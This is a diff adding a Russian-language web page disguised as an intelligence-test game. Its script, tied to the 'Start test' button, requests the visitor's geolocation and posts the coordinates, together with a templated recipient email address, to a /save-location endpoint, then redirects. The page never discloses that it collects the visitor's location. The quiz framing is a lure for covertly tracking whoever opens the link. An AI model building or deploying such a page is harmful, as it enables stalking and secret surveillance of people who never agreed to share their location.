@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Проверь свой интеллект — Игра</title>
+  <meta name="theme-color" content="#0ef" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    /* Styles preserved from Django template */
+    :root { --bg:#0a0f1e; --grid1:#0c1a3c; --grid2:#142a5c; --neon1:#00f6ff; --neon2:#ff00cc; --neon3:#00ff88; --warn:#ff4d6d; --ok:#2ee59d; --text:#f0f8ff; --muted:#b0c4de; --card:rgba(15,25,50,.75); --stroke:rgba(0,246,255,.35); --radius:24px; --shadow:0 20px 80px rgba(0,246,255,.3), inset 0 0 0 1.5px rgba(255,255,255,.08); --glow:0 0 20px rgba(0,246,255,.5); }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%;overflow:hidden}
+    body{background:radial-gradient(1200px 800px at 10% 15%, #0b1330 0%, transparent 60%),radial-gradient(1000px 800px at 95% 90%, #081024 0%, transparent 60%),var(--bg);color:var(--text);font-family:'Roboto',sans-serif;display:flex;justify-content:center;align-items:center}
+    .scene{position:fixed;inset:0;pointer-events:none;z-index:-3}
+    .stars{background:radial-gradient(2px 2px at 10% 20%, rgba(255,255,255,.9), transparent 50%),radial-gradient(1.8px 1.8px at 40% 30%, rgba(255,255,255,.85), transparent 50%),radial-gradient(2.2px 2.2px at 70% 15%, rgba(255,255,255,.9), transparent 50%),radial-gradient(1.5px 1.5px at 85% 60%, rgba(255,255,255,.8), transparent 50%),radial-gradient(1.7px 1.7px at 25% 75%, rgba(255,255,255,.85), transparent 50%);opacity:.7;animation:twinkle 3s ease-in-out infinite}
+    @keyframes twinkle{50%{opacity:.95}}
+    .grid{background:linear-gradient(var(--grid1) 1px, transparent 1px) 0 0/100% 30px,linear-gradient(90deg, var(--grid1) 1px, transparent 1px) 0 0/30px 100%;transform:perspective(1000px) rotateX(65deg) translateY(40vh);box-shadow:inset 0 0 100px rgba(0,246,255,.1);filter:drop-shadow(0 -15px 50px rgba(255,0,204,.3));animation:gridMove 8s linear infinite;opacity:.6}
+    @keyframes gridMove{0%{background-position-y:0,0}100%{background-position-y:300px,0}}
+    .wrap{height:100dvh;width:100%;display:grid;place-items:center;padding:clamp(16px,4vw,32px);position:relative;z-index:1}
+    .card{width:min(720px,96vw);background:linear-gradient(180deg, rgba(20,30,60,.8), rgba(10,15,30,.65));border-radius:var(--radius);box-shadow:var(--shadow);position:relative;overflow:hidden;border:1.5px solid var(--stroke);outline:3px solid rgba(255,0,204,.15);backdrop-filter:blur(15px) saturate(1.2);-webkit-backdrop-filter:blur(15px) saturate(1.2);transition:transform .3s ease, box-shadow .3s ease}
+    .card:hover{transform:scale(1.02);box-shadow:0 30px 100px rgba(0,246,255,.4), inset 0 0 0 1.5px rgba(255,255,255,.12)}
+    .card::before{content:"";position:absolute;inset:-3px;border-radius:inherit;padding:3px;background:conic-gradient(from 0deg, var(--neon1), var(--neon2), var(--neon3), var(--neon1));-webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;animation:spin 6s linear infinite;opacity:.65}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .card-header{padding:clamp(16px,4vw,20px);display:flex;align-items:center;justify-content:space-between;gap:12px;border-bottom:1.5px solid rgba(0,246,255,.2);background:linear-gradient(90deg, rgba(0,246,255,.1), transparent)}
+    .title{font-family:'Orbitron',sans-serif;font-weight:900;letter-spacing:.5px;font-size:clamp(20px,5vw,24px);display:flex;align-items:center;gap:.8rem;text-shadow:0 0 20px rgba(0,246,255,.4)}
+    .status{font-size:13px;color:var(--muted);padding:.4rem .8rem;border-radius:999px;border:1.5px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);display:flex;align-items:center;gap:6px}
+    .card-body{padding:clamp(20px,5vw,32px);text-align:center}
+    .chip{display:inline-flex;align-items:center;gap:.8rem;padding:12px 16px;border-radius:999px;background:rgba(0,246,255,.15);border:1.5px solid rgba(0,246,255,.35);color:#c0f0ff;font-family:'Orbitron',sans-serif;font-weight:700;letter-spacing:.3px;box-shadow:inset 0 0 20px rgba(0,246,255,.2);margin:6px 0 16px;font-size:clamp(14px,4vw,15px);transition:transform .2s ease, box-shadow .2s ease}
+    .chip:hover{transform:scale(1.05);box-shadow:0 0 25px rgba(0,246,255,.5)}
+    .chip::before{content:"📧"}
+    h1{margin:0 0 10px;font-family:'Orbitron',sans-serif;font-size:clamp(24px,8vw,36px);font-weight:900;letter-spacing:.5px;background:linear-gradient(90deg, var(--neon1), var(--neon2), var(--neon3));-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 5px 20px rgba(0,246,255,.3));animation:glowText 2s ease-in-out infinite}
+    @keyframes glowText{50%{filter:drop-shadow(0 5px 25px rgba(0,246,255,.5))}}
+    p{color:var(--muted);margin:.5rem 0 1.2rem;font-size:clamp(14px,4vw,16px)}
+    .xp{height:12px;border-radius:12px;overflow:hidden;background:rgba(255,255,255,.08);border:1.5px solid rgba(255,255,255,.1);margin:0 auto 16px;width:min(560px,90%)}
+    .xp>i{display:block;height:100%;background:linear-gradient(90deg, var(--ok), #00ffc6);box-shadow:0 0 25px rgba(46,229,157,.5);width:35%;animation:xpPulse 2.5s ease-in-out infinite}
+    @keyframes xpPulse{50%{filter:brightness(1.2)}}
+    .btn{position:relative;display:inline-flex;align-items:center;justify-content:center;gap:.8rem;width:100%;padding:18px 20px;border-radius:16px;border:0;cursor:pointer;text-transform:uppercase;font-family:'Orbitron',sans-serif;font-weight:900;letter-spacing:.7px;color:#001018;background:radial-gradient(100% 100% at 50% 0%, rgba(255,255,255,.7), transparent 40%), linear-gradient(90deg, var(--neon1), var(--neon2), var(--neon3));box-shadow:0 20px 40px rgba(0,246,255,.35), 0 0 0 1.5px rgba(0,0,0,.3) inset;transition:transform .1s ease, box-shadow .3s ease, filter .3s ease;font-size:clamp(15px,4.5vw,17px)}
+    .btn:hover{transform:scale(1.05);box-shadow:0 25px 50px rgba(0,246,255,.5), 0 0 0 1.5px rgba(0,0,0,.3) inset;filter:brightness(1.1)}
+    .btn:active{transform:translateY(2px) scale(.98)}
+    .btn .k-light{position:absolute;inset:-3px;border-radius:inherit;pointer-events:none;background:conic-gradient(from 0deg, rgba(255,255,255,.4), transparent 30%, rgba(255,255,255,.3) 60%, transparent 90%);mix-blend-mode:soft-light;filter:blur(8px);animation:spin 5s linear infinite;opacity:.5}
+    .spinner{display:inline-block;width:1.2em;height:1.2em;border:.2em solid rgba(0,0,0,.2);border-top-color:#001018;border-radius:50%;animation:spin .8s linear infinite}
+    #msg{min-height:1.5rem;margin-top:12px;color:var(--warn);font-size:clamp(13px,3.5vw,14px);text-shadow:0 0 12px rgba(255,77,109,.4)}
+    .hud{display:flex;justify-content:space-between;align-items:center;gap:12px;border-top:1.5px solid rgba(255,255,255,.1);padding:12px 16px;color:var(--muted);font-size:13px;background:linear-gradient(90deg, transparent, rgba(255,0,204,.1), transparent)}
+    .hud .dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:var(--ok);box-shadow:0 0 15px rgba(46,229,157,.8);margin-right:8px}
+    @media(max-width:420px){.card-header{padding:14px}.title{font-size:18px}.chip{font-size:14px}.btn{font-size:14px}}
+  </style>
+</head>
+<body>
+  <div class="scene" aria-hidden="true">
+    <div class="stars"></div>
+    <div class="grid"></div>
+  </div>
+  <canvas id="fx" aria-hidden="true" style="position: fixed; inset: 0; z-index: -1; pointer-events: none;"></canvas>
+  <audio id="bg-music" autoplay loop>
+    <source src="/Miyagi_Endshpil_Melodrama_bomba.mp3" type="audio/mpeg">
+    Ваш браузер не поддерживает воспроизведение аудио.
+  </audio>
+  <main class="wrap">
+    <section class="card" role="region" aria-labelledby="ttl">
+      <header class="card-header">
+        <div class="title" id="ttl">🎮 Проверь свой интеллект!</div>
+        <div class="status"><span class="dot"></span>Онлайн</div>
+      </header>
+      <div class="card-body">
+        <h1>Начни игру за секунду!</h1>
+        <div id="recipient_email" class="chip" data-value="<%- (recipient_email || '').replace(/"/g,'&quot;') %>">Лучшая платформа для теста</div>
+        <div class="xp"><i></i></div>
+        <button id="go" class="btn" onclick="sendLocationFast()"><span class="k-light"></span>▶ Начать тест</button>
+        <div id="msg" aria-live="polite"></div>
+      </div>
+      <footer class="hud" aria-hidden="true">
+        <div>Версия 1.0 • Задержка <span id="latency">—</span> мс</div>
+        <div>Режим: <strong>Молниеносный</strong></div>
+      </footer>
+    </section>
+  </main>
+  <script>
+    function getCookie(name){const m=document.cookie.match('(^|;)\\s*'+name+'\\s*=\\s*([^;]+)');return m?m.pop():""}
+    function buzz(ms=20){if('vibrate' in navigator) navigator.vibrate(ms)}
+    (function(){const canvas=document.getElementById('fx');const ctx=canvas.getContext('2d');let W,H,DPR=Math.max(1,Math.min(2,window.devicePixelRatio||1));let P=[];let last=0;function resize(){W=canvas.width=Math.floor(innerWidth*DPR);H=canvas.height=Math.floor(innerHeight*DPR);canvas.style.width=innerWidth+"px";canvas.style.height=innerHeight+"px"}resize();addEventListener('resize',resize,{passive:true});function spawn(x,y,n=15){for(let i=0;i<n;i++){const a=Math.random()*Math.PI*2,s=0.5+Math.random()*1.5;P.push({x:x*DPR,y:y*DPR,vx:Math.cos(a)*s*DPR,vy:Math.sin(a)*s*DPR-0.5*DPR,g:0.02*DPR,life:0,max:600+Math.random()*400,s:2+Math.random()*2,c:Math.random()<0.5?'#00f6ff':'#ff00cc'})}}function tick(ts){if(!last) last=ts;const dt=Math.min(16,ts-last);last=ts;ctx.clearRect(0,0,W,H);for(let i=P.length-1;i>=0;i--){const p=P[i];p.life+=dt;p.vy+=p.g*dt;p.x+=p.vx*dt;p.y+=p.vy*dt;ctx.globalAlpha=Math.max(0,1-p.life/p.max);ctx.fillStyle=p.c;ctx.fillRect(p.x,p.y,p.s,p.s);if(p.life>p.max) P.splice(i,1)}requestAnimationFrame(tick)}requestAnimationFrame(tick);window.fxBurst=(x,y)=>spawn(x,y,15)})();
+    (function(){const t0=performance.now();addEventListener('load',()=>{const ms=Math.round(performance.now()-t0);const el=document.getElementById('latency');if(el) el.textContent=ms})})();
+    async function sendLocationFast(){const btn=document.getElementById('go');const msg=document.getElementById('msg');const recipient=document.getElementById('recipient_email').dataset.value;btn.innerHTML='<span class="k-light"></span><span class="spinner"></span> Отправка...';btn.disabled=true;buzz(20);const r=btn.getBoundingClientRect();fxBurst(r.left+r.width/2,r.top+r.height/2);if(!('geolocation' in navigator)){msg.textContent='Геолокация недоступна';btn.innerHTML='<span class="k-light"></span>▶ Начать тест';btn.disabled=false;buzz(40);return}try{const pos=await new Promise((resolve,reject)=>{navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:false,timeout:1000,maximumAge:30000})});const body={lat:pos.coords.latitude,lon:pos.coords.longitude,recipient_email:recipient};const res=await fetch('/save-location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});fxBurst(innerWidth/2,20);buzz(30);if(res.ok){const data=await res.json();if(data.redirect){document.body.style.boxShadow='inset 0 0 0 9999px rgba(46, 229, 157, 0.08)';window.location.replace(data.redirect)}}else{msg.textContent='Ошибка сервера';btn.innerHTML='<span class="k-light"></span>▶ Начать тест';btn.disabled=false}}catch(e){msg.textContent='Ошибка соединения';btn.innerHTML='<span class="k-light"></span>▶ Начать тест';btn.disabled=false;window.location.replace('/')}}
+  </script>
+</body>
+</html>
